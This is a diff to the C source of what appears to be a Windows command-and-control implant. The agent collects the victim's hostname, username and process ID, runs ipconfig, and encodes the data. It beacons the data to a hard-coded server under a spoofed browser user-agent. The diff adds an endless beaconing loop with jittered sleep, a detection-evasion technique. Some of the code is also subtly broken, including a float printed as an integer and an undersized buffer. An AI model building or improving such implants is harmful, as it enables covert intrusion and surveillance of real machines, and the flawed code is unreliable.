@@ -46,6 +46,7 @@ struct AgentInformation {
     char *Path;
 }Agent;
 
+
 void Registration() {
     DWORD HostnameLength = 260;
     if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
@@ -67,6 +68,7 @@ void Registration() {
     system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
 }
 
+
 void Init() {
     Agent.Address = "192.168.142.128";
     Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
@@ -74,11 +76,11 @@ void Init() {
     Agent.Path = "/";   
 
     // Define data format
-    char *format = "%s\n%s";
+    char *format = "%s\n%s\n%d\n%d";
 
     // Allocate data to encode
-    char *data_to_encode = malloc(strlen(Register.Username) + strlen(Register.Hostname));
-    sprintf(data_to_encode, format, Register.Username, Register.Hostname);
+    char *data_to_encode = malloc(strlen(format) + strlen(Register.Username) + strlen(Register.Hostname));
+    sprintf(data_to_encode, format, Register.Username, Register.Hostname, Register.ProcId, Register.Version);
 
     // Encode data to be encoded
     char *encode_data = malloc(strlen(data_to_encode) * 2);
@@ -109,7 +111,19 @@ void Init() {
 }
 
 
+void Sleep_Time() {
+    int time = 20;
+    int percent = 20;
+    float jitter = (((time * percent / 100) + (rand() % ((time + (time * percent / 100)) + 1))) * 1000);
+    printf("%d", jitter);
+    Sleep(jitter);
+}
+
+
 int main() {
     Registration();    
-    Init();
+    while(TRUE) {
+        Init();
+        Sleep_Time();
+    }
 }
